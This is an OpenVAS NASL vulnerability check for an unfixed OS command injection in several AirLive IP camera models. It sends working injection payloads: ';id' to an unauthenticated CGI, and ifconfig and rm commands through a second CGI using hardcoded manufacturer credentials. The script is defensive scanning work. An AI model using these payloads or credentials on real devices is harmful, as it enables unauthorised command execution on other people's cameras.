###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_airlive_rce_07_15.nasl 11872 2018-10-12 11:22:41Z cfischer $
#
# AirLive Multiple Products OS Command Injection
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2015 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105315");
  script_version("$Revision: 11872 $");
  script_cve_id("CVE-2015-2279", "CVE-2014-8389");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_name("AirLive Multiple Products OS Command Injection");

  script_xref(name:"URL", value:"http://www.coresecurity.com/advisories/airlive-multiple-products-os-command-injection");

  script_tag(name:"vuldetect", value:"Try to execute the 'id/ifconfig' command via a HTTP GET request and check the response.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"summary", value:"There is an OS Command Injection in the cgi_test.cgi binary file in the AirLive MD-3025, BU-3026 and BU-2015 cameras when handling
certain parameters. That specific CGI file can be requested without authentication, unless the user specified in the configuration of the camera that every communication
should be performed over HTTPS (not enabled by default).");

  script_tag(name:"affected", value:"AirLive BU-2015 with firmware 1.03.18 16.06.2014
AirLive BU-3026 with firmware 1.43 21.08.2014
AirLive MD-3025 with firmware 1.81 21.08.2014
AirLive WL-2000CAM with firmware LM.1.6.18 14.10.2011
AirLive POE-200CAM v2 with firmware LM.1.6.17.01
Other devices may be affected too.");

  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"last_modification", value:"$Date: 2018-10-12 13:22:41 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2015-07-07 14:11:14 +0200 (Tue, 07 Jul 2015)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 8080);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port( default:8080 );
banner = get_http_banner( port:port );

if( "Server: Boa" >!< banner || ( "AirLive" >!< banner && banner !~ "(WL|MD|BU|POE)-") ) exit( 0 );

if( banner =~ "(MD|BU)-" )
{
  url = '/cgi_test.cgi?write_tan&;id&id';

  if( buf = http_vuln_check( port:port, url:url, pattern:"uid=[0-9]+.*gid=[0-9]+" ) )
  {
    ret = egrep( string:buf, pattern:"uid=[0-9]+.*gid=[0-9]+" );
    report = 'By requesting "http://' + http_host_name( port:port ) + url + '" it was possible to execute the "id" command. Response:\n\n[...] ' + chomp( ret ) + ' [...]\n';
    security_message( port:port, data:report  );
    exit( 0 );
  }
}

if( banner =~ "(WL|POE)-")
{
  rand = 'openvas_' + rand();
  auth = base64( str:'manufacture:erutcafunam' );
  url = '/cgi-bin/mft/wireless_mft?ap=testname;/sbin/ifconfig%202>%261%20>%20/web/html/' + rand;

  req = http_get( item:url, port:port );
  req = ereg_replace( string:req, pattern:'\r\n\r\n', replace: '\r\nAuthorization: Basic ' + auth + '\r\n\r\n');
  buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

  url = '/' + rand;
  req = http_get( item:url, port:port );
  req = ereg_replace( string:req, pattern:'\r\n\r\n', replace: '\r\nAuthorization: Basic ' + auth + '\r\n\r\n');
  buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

  if( "eth0" >< buf && "Link encap" >< buf && "HWaddr" >< buf )
  {
    url = '/cgi-bin/mft/wireless_mft?ap=testname;rm%20/web/html/' + rand;
    req = http_get( item:url, port:port );
    req = ereg_replace( string:req, pattern:'\r\n\r\n', replace: '\r\nAuthorization: Basic ' + auth + '\r\n\r\n');
    buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

    security_message( port:port );
    exit( 0 );
  }
}

exit( 99 );

